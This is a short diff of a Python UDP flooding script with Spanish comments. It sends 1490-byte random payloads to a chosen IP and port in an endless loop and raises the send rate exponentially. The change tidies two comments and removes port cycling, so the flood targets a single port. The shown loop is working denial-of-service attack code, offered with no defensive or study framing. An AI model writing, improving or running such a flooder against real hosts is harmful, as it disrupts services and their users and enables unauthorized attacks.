@@ -4,7 +4,7 @@ import time
 import socket
 import random
 
-#Code Time
+# Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -16,7 +16,7 @@ year = now.year
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
-#############
+##############
 
 # Definir variables de color
 AMARILLO = "\033[93m"
@@ -87,10 +87,7 @@ try:
     while True:
         sock.sendto(attack_bytes, (ip, port))
         sent = sent + 1
-        port = port + 1
         print("Sent %s packet to %s through port:%s" % (sent, ip, port))
-        if port == 65534:
-            port = 1
 
         # Incrementar la tasa exponencialmente
         base_rate *= exponential_factor
